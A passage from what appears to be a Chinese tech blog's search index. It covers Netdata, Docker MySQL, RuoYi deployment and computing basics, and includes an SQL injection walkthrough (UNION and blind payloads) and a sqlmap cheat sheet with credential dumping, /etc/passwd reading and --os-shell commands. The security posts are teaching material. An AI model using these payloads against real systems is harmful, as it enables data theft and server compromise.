3aa3dcc057137263ef38e56a5fe267836d5531de1e3981baa2e674fe37e64c093d9c4f87e6c3670c12a14df17252e48486e301482715900cdfb62abe71ca11ba26c36d24dfa1f5330ff67eab276126eb266a6f9f0cd4fd74bb13d30087c985f5ae8e85825bd213a4fe34675dff6bcb7a4738d53e4291f400238b377bdbfe2f271f0bbe59a8a8604873c1cded8f215572d7cd6887b4bccdc011f728bd3ff2a5b3e4006460cb9c1c63b3d3b3cc2bc1160ff0e78876cf6efdfa17a19719d71e1cd0752130c25bc69abe253828280214f7380c0824b0a4176e61bc046219bde00495854d9e24f595de22cbb730336dee69e05139682d38f10e12fce61c489c69b000f745350a6a8aacff80cb3fa9779b68d7d4906898303a89839a40a16b646a72a4c8eee781e613bb1c4a747139885c6c937b3d0c06010d01845cf80fd71dadf54db60222b67e8811c016ce9bd747544271d177751e3289318f2299628fb14fbc7323bb3b5a4cc81a8051fac2380d04292be26319080f44506a76da7c93f476c329e5e60752967490c9d997ad02b91dd1f1ccfc56268111add0fb4c2a88596d43e307a72838c140ccdfcfb3b30d955a014076520a0ddccd5524607cddf7b22abfa94868488b5765ee0d9310b653671fc231699285a661b39562d0f1599bd00748e730993ee6427eb103c6a23e2a3889f469de0b78e66fe809adc8f8f3f8fe3b25d04faa791c2c50aedf8d730270b2341bdce6aaa97fb6057eebf7bf8235b9d715bda20dd1559eb342e108289261b8226f0d6597bb559ec94717744bac2db1f282ce89fddaea2d2668f2aadda24ab85c03176f37f88eb700a717a6fb1becda2a4de0ad5a0d0be4d1ec0dcf0ac39c7963ac4971a4429508713a516cf35bfeca103a7a8b359382c09efb7de6b2fdf808c38bd5174ba8c46f13e33c5f47a971bf7d2f55d15f57bfa9d03a6c77f06f36ef76bf863c9d4667ee956a1d4f9de6163192f25492b6bdef4b59b1b3ca298b870369e62766e7ead6622b9ce536f541265ec01d859a1d79421069662a9ffe441b0b810175f39020b49b8a0dc6c11f7134f68fd2636472c9c8f60af6af5d302b00ba7434e3fc6d3bbc18b317adf204a605de221b8672e872ae61ab22c9a6524e12988d6a3a67a13bc3a522bc677bdfc71b0322ab7849852da3a70a4a6b3d5866468d662f9a91dc0b8d84c8bde75e1f8a3ea30ed325c116c753170afd154bf582fa1b227cddd6e57a8183edc8d7d3fbb50c5c16edecb4ef63852c0667d874d8d809376bfabb430c12cf84d83eef271bf8ec0537683e2cc42516d66076772b7fe2da7ff6a0ba77e6172819da25c3287a34fded2706f13890bbbafffdf6e8ac5eaf39febd3ffb1fd2fb33cddb8b4aaf3a0815e8106fc8221f731a02977fe649ced43b7c46ff46eb2407e22327cb4d99f415326b20289298df52b8030ffa4fcfc45b278179d1fb77507006dd1d18fd3e8484f7ccfe74f0a4da6cb4498b4a0a779a790346ea9b6bd05a62da834ba1d124f60efddf7d8a6a59d96464397c9ad82a01b746763545e8b08f66f9c5ead1373e348290940679f023611013c7c0706cc0093a988b3bcbbb46ce346cc05da560741d3742ddc3f0937a7cb9b70c4f801ff5299b03815f41260e82109b21c84bede4ce96d91ebf061dc63dac9ce5fdf003a3b9289953915b5ed4d9b1c8a7e624ae9cbbc99e23cfd2a31c4b261972ca577d734d60639182e5ee0c808f542163a2c447063e2bc77659cd458042d15bb8e7737abe8e606ddfe89825c7a0b8888178645e89ac4def4c3ffe150533daf0aa417201100bfa38690ff95b46d3559b4ebc6c747c016e38310fef139520c4a4c38dbe72e17b17dcf9eaeabef7b8b980fd7c0710ffdf9e09c7b56d464ffe7698b44516fe1907c07aa7e07d308a766253bc9f145758dbdf55d3b8b08ae2a5ce87f8f0f630d30cb41ab5649cbc22b8d70270b4112218c22eb4cb9f3cadbc298cfaf5218337c6f5b23fb1867b3a1f54ea94c0d158a9c9f9e2165b2e44b0cd566021fb7929f3e58f6a095a9d517fb7f54412f9bd3c440075d4f2ffdf616a7d21ea90e2d4d321656259f7774d11de8da7bf5ef89f303175cd7e5117eb671d0ed72dc13bc3a965b4cd7c3077cccbcb025bf5c4abda6f5d0431e0d9561a2e190442ad5c37011c2cbc3389c31174c4bea43f07cc98083009cbdea5459dfd4b08c4ca69161deaf7583f2a26236e40621b9bdc59d5dddb3cb4b8d1ec2170225ddd6ab7a77d9db29c98fc46450afc9fc1815406ce08afa21164fe8496030345df25f272432b1f5af059be4cece4ea699cbe5cbf49d846c63ca070248b41d163f2f9fbff8977bcbcfac5ba19d69391ee568845e913a1158d485e69eb7c64552f8dd2ef3df3b50fd182cda604332722e37105d2ae686dafa13dd5ca90487ada9737e4b638083e86f5e1f69345de9edda96487ccee2f3909c211ffafc6411c232b3b286a2610f2db58e4703ab2d438cc42c6689311860dc72b6badbd6afe2f8d3aa4c2544040f674249df5ed40004bb295ddaf0c0d4a8fb7fe53fbb3db71e7fafa2c7a8030da164412d0a4de6f2dfafca7c1e47b0f9dfbfc45849daf56da3916f038fd7c13d3352a1e3c2afd616ebbca063dbc92fd73f5881f18523e825b722167e09617e44eaa2348d68fd537124913f6b5961d31aaabb698264a8fd2ff4838cde9a72a578e18133e08596976dd1917a7078bc07347a7b71d2ded548a73dc5349739bab87286233025bcede4d9f72b9d8f43edeabf1f0b79dc7bac64aa1db12f434bbaa38483a331f8dee54ca5f468e73055f10061af28958c0df8949564878c5e876f8d2a97d67ee7ad4950e6dda458f40983b2b1f5aeecfdfab00d8cf8c24cbd890cc52ca6a17ac658a849c45c9e4ecb693b5acdc995a1d4ad370bc2189d724cdcc0ffb4cfec142955b5e5cec36da4eadc68e95bc1ee907c25e2c2d38e3cfdfe8e413403f2f174c369bbc64be9ea6b0fa5d6fc98bc54d0763c564f17c813bddefcc22e414d17d40165fcd3bfd1068714affd79aba5186f963751f1d1caa4d4be287f26241f5a843b35a27ca618a59c3d523e64a5f703381bcef057b36bde71fff819a584fa22201e5b90938cc4aab7b4d20bdf4a7bf8df1f22106b81367fad71fdbd10362304351758fd0f6f11f427ad2fd814b2e076c5f0e5b1ce09b426193601621b7c119dc196760e865dad6dcb941778ef4af88efa7fe57f0d6c8f6d41be0e0b8f677ef3d1c673edd75a9d508874737eb64895fa6adf61573c4f2cf77627749b17429c6dd8ca16f1828f2d04ef1b1d8c940d4b9a9ff5976424045a0b1984eb9b814a20fce9d2c25f084f087b890347f3cb08e6ef0416f25a84ed7f16f1db59384f0a6c57fdeca2dfe2e428ba43c11cd1dfefa4f1bf2ea75f407ebcced75bfab9484c858f49cf06688c2c1fe264d2d328c7401dbc4178ed3cca8d379c411666a9c9ecdaa4dca6ec6915e455ed586d749260010dc399e53d7ce62c9a0f4e654bc1d71579f419d223d3e2215c823d1d836cd41836dc326765af068a86403456ba70bfb0b8c83e5681a1857e1848c67bdfbfab9c95dc09da539e617bc51e37be51de779348fe1a65750102384e376a518e6456ecdaa63e183b52d8572fdc2b1a3755b0584349fd3fd306723e29d98b4a4958874eb19e8d6cc5783b78ead00e0a35001ceae52e9d295b9fc9cd8b8e2b7f58309bb5e684db1e273d3bcbd92be93b17925d2d0e400bcaed978262bf3f7c3ba9fa9de7aba82b1de18bd1cba6acdaae3f796df03e7740fa4a7026793268ca781915650f23599be2f0b2b26af35a1e996a962f5728e1629be1a156d2268eded036bf81f2560eb4a38656673d0c522916e2940a593d91dab127b11d6f6ba1d7757a2a7c0372f8844cf80af6593db54ce0a23ec65b2f2eff93e0202737dbeb08aea9ed97e3ff87ceccc4e3ff3a04c8a0dfe9f5223c8f5d2ceaa378241db98d702d0600a6d6c88e6eb968beb04f75388706a0b9c876cfb1f758f7b45663cf6d42648d71b4653dcc6d4e2cb82c4c5dba1fc6afb7e5813842304a99ceaaa17047081a26eedac9f72efbec010ec709d8dc42e7c09caaf8d75112efbc5273c56c4d149453405799a8d8b3b0aa89295f4234452cf08a20ccf3c06d91013ce680b15be1f8802c1d145fcd9c7b5c346bd5ae22c5f99f55a4ec1931a348e7d17b65245ec0b04361141050a90a2ed3f5199b0b98cb99eca1abe57fbed13fd70e2e9a7e2dbfc93dd2b7db80796af5757c28b4e62e3dc9c389cacefc1016143421170b0825792a99f8712d182d72fa8e68cc834de57459d0f6bbddae35e28ff96e9dff9a5f4121b8aa3ea00d3be422514e2aec47e270497238eb2b52d54a09b0a5287d44db00d9316aeffaba4392499dbf74469e08577c56d5d0935633748cd164540a255c69a099b61dc905b4e1b7f41c02dd0d66f2ca7775cf8859af582f76e155524daddf7a7e114e3b7fd4d79313ef48099ff949c7dd2aceedd462fca191973da80c444155385f392b4d4b633b90931a88d1d795ac8191062d33254db355b3a61010a03961044dd0c0532179eb3375c95166c417442766ecba8362c2beba7502a2f617b5b745e39e66ab43119237da38700f703c38fc912fd9bfe49387da3636656628651bb1cf5b8226d16b55fa715a63f97e5ede6ae65ec3e4315a7dfd6b86849046381489fbbd167d3556797182ae9ac66fb97b51108ee3711d67166f5439948e0eb5b5db8c401e6cf26463a6a30eca3458490bb5071ddadbfb57bae57467c0a35cbb7002bc86f161061441f8a69a5ee045b1fff3202446415f687090cf28c6e86cf83ab1b16e2f5664229a07c52bec8fc14345466c9b3dfa03e78dcffb100a711ed0f7071f9997317a721a1b7d75af76dc61cf5f155b57b0405e6ec43c8a97729b26630a3882a26864fcf805d260febf7299ef840e8010f687fd162a462624f45ef64fa23fc3bcc4533220b112addb71fb7a788827b188fe9c2b20f581f406cd73444ce38ff9a0760ce54e56295eec2c15d7f1fb0048d2caa80a048d23ff9e1d7ab2abccba8b99a91e53ff88734ad1212e293cc6307c96cb9e615a9f75ba88c1a455f2bad223a9e7b7afb003faff1865ba221a903cc976f06f858d5a0df10a22a806f2738a9bbb3ee9064d082783880f5f2244a7dc8d06edbd3f2c217b7bf85146cd4d21e030749b2e1bf7f199339bb558e185179d8612818216b83b373adfcd0a290326844dc18e3450bd382e19131a041397b5dbd3d93dbed98807aedd58a9883067da3d81b803da270276c6231892e64270410b2200950970024cc350bb4180162fe319d69e429ce0aa1b84ef1d71f96bb27df468d34ec263290080eb4737d56c6e7d15d690cf78cd7237ffd99f2017a63fd372955747617d8a2f7212ce7035fd09edc697190182b7965fa35dd62281c1f86555017834c21876e907de6193ea0e85d7a5e33680e81e70b342350275a80b98fd902bc7026fe474f6e7345eece9ffe6ab92e389c989ea246f2fabe9d424d9bc359adddc9295260ab854198eca26f6e30da77e776ad5db00a0a4748b8ab37bc95ead7ce1bcae9b21ff2bf1927c65c37094c64eddb6f1b2e409396b6917427244bc45d681de64dbef3f5f9dd3860c4b4d3d23fcedbf0ab495edea33f0493815d170d888f7748ab1ca96faeae64d368ec3bf467f474c4034a9aa23db9ff4dab7b027c130ec966678446a4fce6555ce910a900fe5bcc34b818ad442c0dac1171cb5046ce1b39dad6b4568832407aa46cb05de2af987c04a44e09abd93ef76f69b99e602c2f3113e6aceeaef279277fe3e1e38da275c69102ced59a03068acff4dabb36a8fa84f4ebe2677ddbb27c8c6f17ebca724f477191d14366cceeaa008168ad4817378698161c7bd81dfdfaed7250669c75da1fda0ec708e4614a18bcfb67caa98d58dcf4c4a4c7000df069abdc716c0a8222b2773e3297b4f5f9d4fc81f3850228cca0659dd07b8872e87d8f95f6a29a2c0512c4090434b2b308c77feda88b80e1a65106252f6a201805575f513546d32184af436ead370bed307f815e233005e9fc61e6f4405dfc1c6c3526a90051b9697bee7edaa04cbcb1be7aeff7f282941222a6f6fc3ff3d6d4f7c6d8c33c572afd52e8e8b510b3cfcee1dea9cd671489b4f9f57d4f82f550841d9a8f9c5c6c6b11091a2645b8fd4c4140f342eff0a7bd30fab1b5aa534e4c738df554a73ec3c80730b610ecdfb745ea9340df98f0b84cb85816bf977b52450ef1a9a21f2f5741d8785e4402c3138cd76b65d42e19377980051e59dd51849f717fc11c72c8ba91992256b23fb2c6ff1f1107c2055b3737f577415c8a718911f76f83e839b4aede8bf00873406fc475c28df1692b26bbdb87f82ab8135b51c7d937fe8255ee481109d0bfcd5f2bbe135a064aac7de7dcc40443e6f50361cecb7983c4fe41e7d6fc32dcd89e585a5b9d4278c49ecc34a9bb4fe5dcbda63a334109664c5e244231e896a6111c99774831acb6b966a9f7b1ecaf254b0afb7f758dd3aecd1801501f5f5fe2ba97a814c318d8c131be57efa4e848aa5e31c35d9e6e255aca6ac838a8626c8b7f42eb104388ba64818040494945ad8b5beb326d1c80e7ed1bc6ea50dd9f45e76d2340da2eb2973719b9a8652abad55846bb584fd4d1d17f0bb334dc0fa362335c2d97044dea8d7a5ec7186cb91e1efc88573\",\"name\":\"785ca6708470f42b52906f604aed157bcc7f941008981311f0aa68bdef3567ae\",\"account\":\"7c5d7795860f6d3efec596f1f4ec5980d8e5ce47d5f68fa47d43fc0858284022\",\"salt\":\"735de73548546a8fd94de1e95046df86\",\"post\":[\"48c1c75e195a66b0dcb20243e5b79532d2412420fd59b5530502baea7e376002\",\"4aad6938451b398c8544546bb8dc9e17f8926d9d92ce3c400d552ffb05a9659b\"]},{\"result\":\"\",\"name\":\"5dca4de7c25ef54fe2d0e3389b7e28e63b715e2911125343e110d31623aee81a\",\"account\":\"cef472f90aeb4b39bcf8dcb875eca6a1c49a77835e697462711199985613ea69\",\"salt\":\"735de73548546a8fd94de1e95046df86\",\"post\":[\"48c1c75e195a66b0dcb20243e5b79532d2412420fd59b5530502baea7e376002\"]}];\n                if(name.trim() === '' || username.trim() === '' || password.trim() === '') {\n                  alert(\"请输入信息\");\n                  return;\n                };\n                const id = 'ef817dbb';\n                let login = false;\n                let index = -1;\n                for(let i = 0;i","tags":["路由","网络","思科"]},{"title":"netdata","url":"/posts/c3d71371/","content":"概述\nNetdata能够帮助用户实时监测系统的性能指标，提供丰富的可视化界面，使用户可以轻松查看各类指标，包括CPU使用率、内存占用、磁盘IO、网络流量等。\nNetdata自身的资源占用非常低，并且非常快。\n安装\napt install netdata\n配置\nvim /etc/netdata/netdata.conf[global]        run as user = netdata        # 这里为了方便用了root，生产环境下禁止用root用户        web files owner = root        web files group = root        # Netdata is not designed to be exposed to potentially hostile        # networks. See https://github.com/netdata/netdata/issues/164        # 这里是为了让所有设备可以访问web页面，可以根据自己的需求来配置        bind socket to IP = 0.0.0.0\n启动\n# 启动前记得放通19999端口service netdata start\n停止\nservice netdata stop\n访问页面\n至此部署成功\n\n","tags":["netdata","系统监控","Centos 7"]},{"title":"Win10 修改默认文件资源管理器","url":"/posts/ce14aeee/","content":"首先安装新的文件管理器，这里以Sigma file manager为例。\n打开注册表\n\n修改数值数据为Sigma file manager的路径\n\n\n重启计算机即可\n","tags":["Win10","文件管理器","注册表"]},{"title":"Web安全 SQL注入","url":"/posts/4fedeb6/","content":"只说步骤，以下均用http://localhost/index.php?id=1来注入。以MySQL为例。\n\n实际情况请考虑转义字符。\n\n用到的函数(根据实际情况使用)\ndatabase()：返回当前所在库。\nlength(string)：返回字符串长度。\nascii(string)：返回字符的ASCII码(int)。\nSUBSTR(string,int1,int2)：截取字符串，int1从1开始计数，是起始位置。int2为截至长度。\n显错注入\n\n检测是否存在SQL注入，下述情况即存在。\n\n-- 有数据id=1 and 1=1 -- 无数据id=1 and 1=2\n\n使用order by语句测试有多少字段，注意观察页面变化。这里假设有三个字段。\n\nid=1 order by 3\n\n查看当前所在哪一个库，这里id=5是查不出来数据的，这是为了第一条数据是查出来的库名，后面select语句的1，3是为了占位，因为一共有三个字段。\n\nid=5 union select 1,database(),3\n\n知道库名后(假设为user)，从系统表information_schema.tables查出user库下有哪些表。\n\nid=5 union select 1,table_name,3 from information_schema.tables where table_schema=&#x27;user&#x27; limit 0,10\n布尔盲注\n\n检测是否存在SQL注入，下述情况即存在。\n\n-- 有数据id=1 and 1=1 -- 无数据id=1 and 1=2\n\n猜测库名长度，这里猜出来是12\n\nid=1 and length(database())&lt;=12\n\n一个字符一个字符的猜测库名(一般会写个脚本猜测，这里解释原理)，ASCII码从48-122包含数字，小写字母，大写字母和一些符号，这里猜测出来库名是 kanwolongxia\n\n-- 类似于这样，直到猜出来库名id=1 and ascii(substr(database(),1,1))&gt;=109id=1 and ascii(substr(database(),1,1))&gt;=103id=1 and ascii(substr(database(),1,1))&gt;=107id=1 and ascii(substr(database(),2,1))&gt;=97id=1 and ascii(substr(database(),3,1))&gt;=110id=1 and ascii(substr(database(),4,1))&gt;=119......\n\n猜解表的数量，这里有3个表\n\nid=1 and (select count(table_name) from information_schema.tables where table_schema=&#x27;kanwolongxia&#x27;)&gt;=3\n\n猜解每个表的名字，第一个表是loflag，第二个表是news，第三个表是user\n\nid=1 and ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;kanwolongxia&#x27; limit 0,1),1,1))&gt;=109\n\n猜解表的数据，先看有几个字段，再猜解表字段是什么。\n\n-- 查看表有几个字段id=1 and (select count(column_name) from information_schema.columns where table_schema=&#x27;kanwolongxia&#x27; and table_name=&#x27;loflag&#x27;)&gt;1-- 猜字段，loflag的第一个字段是Id，第二个字段是flagloid=1 and ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;kanwolongxia&#x27; and table_name=&#x27;loflag&#x27; limit 0,1),1,1))&gt;=97-- 猜解flag，有五条数据，第一条是zKaQ-QQQid=1 and ascii(substr((select flaglo from loflag limit 0,1),1,1))&gt;=97\nHead注入\n尚未更新\n","tags":["网络安全","Web安全","SQL注入"]},{"title":"Win10 部署若依前端分离版","url":"/posts/621e92f2/","content":"环境部署\n\n开发和生产都是此环境\n\nJDK &gt;= 1.8 (推荐1.8版本)Mysql &gt;= 5.7.0 (推荐5.7版本)Redis &gt;= 3.0Maven &gt;= 3.0Node &gt;= 12\n下载源码\n建议用 git clone 来克隆项目。\ngit clone https://gitee.com/y_project/RuoYi-Vue.git\n\n网址：https://ruoyi.vip/\n\n\n\n\n个人习惯，可以不做\n\n将ruoyi-ui移动到上一级目录，并将RuoYi-Vue修改为ruoyi-master\n\n\n开发环境部署\n后端配置和运行\n\n\n\n\n前端配置和运行\n\n\n\n生产环境部署\n\n此处生产环境为Centos7\n\n\n\n\n\n\n详细配置见若依文档https://doc.ruoyi.vip/\n\n\n","tags":["RuoYi","若依管理系统","前端分离版"]},{"title":"sqlmap 注入","url":"/posts/304b10ed/","content":"基本检测\n检测 GET 参数\nsqlmap -u &quot;http://target.com/page?param=value&quot;\n检测 POST 参数\nsqlmap -u &quot;http://target.com/login&quot; --data=&quot;username=admin&amp;password=pass&quot;\n只检测特定参数\nsqlmap -u &quot;http://target.com/page?id=1&amp;name=test&quot; -p id\n添加会话 Cookie\nsqlmap -u &quot;http://target.com/protected&quot; --cookie=&quot;PHPSESSID=abc123&quot;\n指定数据库类型\nsqlmap -u &quot;http://target.com&quot; --dbms=mysql\n使用随机 User-Agent\nsqlmap -u &quot;http://target.com&quot; --random-agent\n使用代理\nsqlmap -u &quot;http://target.com&quot; --proxy=&quot;http://127.0.0.1:8080&quot;\n使用 tamper 脚本绕过防护\nsqlmap -u &quot;http://target.com&quot; --tamper=space2comment\n风险级别和测试强度\n–level 参数（测试级别） ​​Level 1​​：仅测试 GET 参数（默认） ​​Level 2​​：测试 GET 和 POST 参数 ​​Level 3​​：增加\nHTTP Cookie 头测试 ​​Level 4​​：增加 HTTP User-Agent 和 Referer 头测试 ​​Level 5​​：测试所有 HTTP 头（包括 Host 头\n）\n–risk 参数（风险级别） ​​Risk 1​​：使用低风险 payload（如基于错误的注入） ​​Risk 2​​：增加基于时间的盲注和布尔盲注\n​​Risk 3​​：使用 OR-based 注入（可能修改数据）\nsqlmap -u &quot;http://target.com&quot; --level=5 --risk=3\n检测数据库版本\nsqlmap -u &quot;http://target.com&quot;  --banner\n检测当前用户\nsqlmap -u &quot;http://target.com&quot; --current-user\n获取所有数据库名称\nsqlmap -u &quot;http://target.com&quot; --dbs\n获取当前数据库名称\nsqlmap -u &quot;http://target.com&quot; --current-db\n获取指定数据库的所有表\nsqlmap -u &quot;http://target.com&quot; -D &lt;database_name&gt; --tables\n获取当前数据库的所有表\nsqlmap -u &quot;http://target.com&quot; --tables\n获取指定表的所有列\nsqlmap -u &quot;http://target.com&quot; -D &lt;database_name&gt; -T &lt;table_name&gt; --columns\n提取整个表的数据\nsqlmap -u &quot;http://target.com&quot; -D &lt;database_name&gt; -T &lt;table_name&gt; --dump\n提取特定列的数据\nsqlmap -u &quot;http://target.com&quot; -D &lt;database_name&gt; -T &lt;table_name&gt; -C &quot;username,password&quot; --dump\n获取数据库用户列表\nsqlmap -u &quot;http://target.com&quot; --users\n获取用户权限\nsqlmap -u &quot;http://target.com&quot; --privileges\n获取操作系统信息\nsqlmap -u &quot;http://target.com&quot; --os-info\n读取服务器文件（需要高权限）\nsqlmap -u &quot;http://target.com&quot; --file-read &quot;/etc/passwd&quot;\n写入文件（需要高权限）\nsqlmap -u &quot;http://target.com&quot; --file-write &quot;local_file.txt&quot; --file-dest &quot;/remote/path/file.txt&quot;\n执行操作系统命令\nsqlmap -u &quot;http://target.com&quot; --os-cmd &quot;id&quot;\n获取交互式 shell\nsqlmap -u &quot;http://target.com&quot; --os-shell\n提取所有数据库的所有数据\nsqlmap -u &quot;http://target.com&quot; --dump-all\n使用多线程加速\nsqlmap -u &quot;http://target.com&quot; --threads=10\n使用代理（如 Burp Suite）\nsqlmap -u &quot;http://target.com&quot; --proxy=&quot;http://127.0.0.1:8080&quot;\n使用 tamper 脚本绕过 WAF\nsqlmap -u &quot;http://target.com&quot; --tamper=space2comment\n保存会话以便后续使用\nsqlmap -u &quot;http://target.com&quot; --save\n清除缓存\nsqlmap -u &quot;http://target.com&quot; --purge\n","tags":["sqlmap","Web 安全"]},{"title":"docker 安装并使用 MySQL","url":"/posts/9a12c6d2/","content":"\n提前找好要安装什么版本的 mysql,这里用的是 8.4.1\n\n拉取 mysql 镜像\n# 拉取最新版本的 mysqlsudo docker pull mysql# 拉取指定版本的 mysqlsudo docker pull mysql:8.4.1# 查看镜像sudo docker images\ndocker 启动/运行 mysql\nsudo mkdir -p /opt/mysql/conf/conf.dsudo chown -R 999:999 /opt/mysql/confsudo chmod -R 755 /opt/mysql/confsudo docker run \\-p 3307:3306 \\  # 这里为了区分，&quot;:&quot; 左侧 3307是宿主机端口，&quot;:&quot; 右侧 3306是容器端口。--name mysql-8.4.1 \\  # 容器名称-v /opt/mysql/log:/var/log/mysql \\  # 这里三个 &quot;-v&quot; 是备份mysql的数据和配置。-v /opt/mysql/data:/var/lib/mysql \\-v /opt/mysql/conf:/etc/mysql \\-e MYSQL_ROOT_PASSWORD=root \\  # 设置当前mysql实例的密码-d mysql:8.4.1 # 需要运行的容器名称和版本\n启动并进入 mysql 容器\nsudo docker exec -it mysql-8.4.1 bash\n设置远程访问\n\n生产环境不建议用 root 远程访问！\n\nmysql -u root -pmysql&gt; ALTER USER &#x27;root&#x27;@&#x27;%&#x27; IDENTIFIED WITH caching_sha2_password BY &#x27;这是密码&#x27;;# 修改本地密码 (可选)mysql&gt; ALTER USER &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED WITH caching_sha2_password BY &#x27;这是密码&#x27;;mysql&gt; FLUSH PRIVILEGES;\n","tags":["MySQL","docker"]},{"title":"计算机基础","url":"/posts/c783f2ce/","content":"计算机的诞生\nENIAC\n\nENIAC 是在第二次世界大战，美国军方为了精确计算新式火炮的弹道轨迹而研制的。\n\n\n1946 年 2 月 14 日诞生\n世界上第一台电子数字积分计算机\n美国宾夕法尼亚大学\n17468 个真空电子管、1500 个继电器、70000 只电阻以及其他各类电子元件，功率 150 千瓦\n占地约 170 平方米，重达 30 吨\n使用十进制表示数据，没有使用存储程序和程序控制原理\n\nEDVAC\n\n1945 年由冯·诺伊曼、莫奇利、埃克特等提出，1951 年完成\n电子离散变量自动计算机\n使用二进制表示数据\n采用存储程序和程序控制\n由运算器、控制器、存储器、输入设备、输出设备 5 部分组成\n\nEDSAC\n\n1949 年 5 月 6 日首次试运行成功\n电子延迟存储自动计算器\n使用二进制表示数据\n采用存储程序和程序控制\n由运算器、控制器、存储器、输入设备、输出设备 5 部分组成\n\n计算机的发展\n\n\n\n分代\n电子元件\n运算速度\n\n\n\n\n第一代(1946-1957)\n电子管\n几千次\n\n\n第二代(1958-1964)\n晶体管\n几十万次\n\n\n第三代(1965-1970)\n中小规模集成电路\n几百万次\n\n\n第四代(1971 年至今)\n大规模/超大规模集成电路\n上亿次甚至亿亿次\n\n\n\n计算机的发展趋势\n\n巨型化\n微型化\n网络化\n智能化\n\n计算机的特点\n\n运算速度快\n计算精度高\n具有记忆和逻辑判断功能\n具有自动执行功能\n\n计算机的分类\n按照性能划分\n\n巨型机\n大型机\n小型机\n微型机\n工作站\n\n\n在 2017 年 6 月进行的世界前 500 强高性能计算机（Top500）测试中，我国国家并行计算机工程技术研究中心研发的“神威· 太\n湖之光”巨型机排名第一，峰值速度达到每秒 12.5 亿亿次浮点运算。\n\n按照处理的数据划分\n\n数字计算机\n模拟计算机\n数模混合计算机\n\n\n目前日常生活应用的计算机多为数字计算机\n\n按照功能用途划分\n\n通用计算机\n专用计算机\n\n计算机的应用\n\n\n科学计算\n\n\n过程检测与控制\n\n\n数据处理\n\n\n计算机辅助系统\n\n计算机辅助系统指通过人机对话，使计算机辅助人们进行设计、加工、计划和学习等工作\n\n\n\n\n类别\n简写\n\n\n\n\n计算机辅助设计\nCAD\n\n\n计算机辅助制造\nCAM\n\n\n计算机辅助测试\nCAT\n\n\n计算机辅助教学\nCAI\n\n\n计算机辅助教育\nCBE\n\n\n计算机管理教学\nCMI\n\n\n计算机集成制造系统\nCIMS\n\n\n计算机辅助工程\nCAE\n\n\n\n\n\n多媒体\n\n\n生活工作和学习\n\n\n计算机系统\n\n由硬件和软件构两大系统组成\n计算机硬件系统包括主机(由 CPU 和内存组成)和外部设备(由外存储器、输入/输出设备)组成\n计算机软件系统是计算机所需的各种程序、数据及其相关文件的集合，可分为系统软件和应用软件两类\n\n\n计算机硬件系统\n\n运算器\n控制器\n存储器\n输入设备\n输出设备\n\n微型计算机的主要性能指标\n\n主频\n字长\n存储容量\n存取周期\n运算速度\n\n运算速度是一项综合性的性能指标，单位有 MIPS（每秒百万（106）条指令）和 BIPS（每秒十亿（109）条指令）等\n\n\n\n计算机软件系统\n软件是指计算机运行所需的程序、数据和有关文档的总和。没有安装任何软件的计算机称为“裸机”，无法完成任何工作。计算机软件系统通常分为系统软件和应用软件两大类\n\n程序设计语言\n\n\n\n语言种类\n可读性\n可移植性\n执行速度\n能否被计算机直接执行\n\n\n\n\n机器语言\n差\n差\n快\n能\n\n\n汇编语言\n较好\n差\n较快\n不能\n\n\n高级语言\n好\n好\n慢\n不能\n\n\n\n\n用高级语言编写的程序称为源程序，是源代码和数据构成的文件。目标程序是指源程序 经过翻译程序翻译后的二进制目标代码文件。可执行文件是链接程序将目标代码链接后生成的可以执行的文件。\n\n数据单位\n\n位(bit,b)\n字节(Byte,B)\n\n字节是计算机中用来表示存储空间大小的基本单位。在计算机中，通常将 8 个二进制组成一个存储单元，称为字节，用大写字母 B 表示。计算机的主存储器容量、磁盘容量都是以字节为单位表示的。\n\n\n\n存储器可容纳的二进制信息量称为存储容量。目前，度量存储容量的基本单位是字节，此外，常用的存储容量单位还有 KB（千字节）、MB（兆字节）、GB（吉字节）和 TB（太字节）。存储容量计量单位之间的换算关系如下：\n1B=8b\n1KB=1024B=210B\n1MB=1024KB=220B\n1GB=1024MB=230B\n1TB=1024GB=240B,其中 1024=210。\n\n字(word)\n字通常取字节的整倍数，是计算机进行数据存储和处理的运算单位。字和计算机中的字长概念相关，字长是指计算机同时处理信息的二进制的位数，具有这一长度的二进制数则被称为计算机中的一个字。计算机按照字长可以分为 8 位、16 位、32 位和 64 位机，例如，在 64 位机中，一个字则含有 64 个二进制位。\n\n数制转换\n概念\n数制是用一组固定的数字和一套统一的规则来表示数目的方法。其中，十进制主要作用于计算机的输入输出，实现人机交互；二进制是计算机内部所采用的数制；八进制和十六进制是为了方便书写或显示二进制，被看成二进制的缩写形式。\n基数和权\n一个数无论采用何种进位制表示，都包含两个基本要素：基数和权。\n\n基数\n基数是指各种进位计数制中允许选用基本数码的个数。例如，十进制的数码有 0~9 共 10 个，因此十进制的基数为 10。\n权\n每个数码所表示的数值等于该数码乘以一个与数码所在位置相关的常数，这个常数称为权或权值。权的大小以基数为底、数码所在的位置的序号为指数的整数次幂。\n\n例如，一个十进制数 3643.76 可表示为：\n3643.76=3×103+6×102+4×101+3×100+7×10-1+6×10-2\n在这个数中，有些相同的数字由于处在不同的位置，他们代表的数值大小也不同，如千位的 3 和个位的 3 大小就不一样。各位数值的大小由权值决定，该数的权值从左到右分别是 103、102、101、100、10-1、10-2，此表示也称为位权展开式。\n数值的表示\n\n\n\n进位制\n基数\n基本符号(数码)\n权\n表示\n\n\n\n\n二进制\n2\n0,1\n2\nB\n\n\n八进制\n8\n0-7\n8\nO\n\n\n十进制\n10\n0-9\n10\nD\n\n\n十六进制\n16\n0-9, A-F\n16\nH 或 0x\n\n\n\n数制转换\nr 进制转换为十进制数\n对于任意 r 进制数，均可以先写出它的位权展开式，然后在按十进制进行计算即可将其转换为十进制数。\n例如：\n(1111.11)B=1×23+1×22+1×21+1×20+1×2-1+1×2-2=15.75\n(543.2)O=5×82+4×81+3×80+2×8-1=355.25\n(A10B.8)H=10×163+1×162×0+161+11×160+8×16-1=41227.5\n十进制数转换为 r 进制\n十进制数的整数部分和小数部分在转换时需作不同的计算，分别求值后在组合。\n整数部分：采用“除 r 取余，先余为低，后余为高”法。即用十进制的整数反复地除以 r，记下每次得到的余数，直到商为 0，然后将所得到的余数倒排即为 r 进制各位的数码。\n小数部分：采用“乘 r 取整，先整为高，后整为低”法。即用十进制的小数乘 r，得到一个乘积，将乘积的整数部分取出来，将乘积的小数部分再乘以 r，重复以上过程，直到小数部分为 0，然后将所得到的整数正排即为转换结果。\n例如：将十进制数 100.125 转换为二进制数。先对整数 100 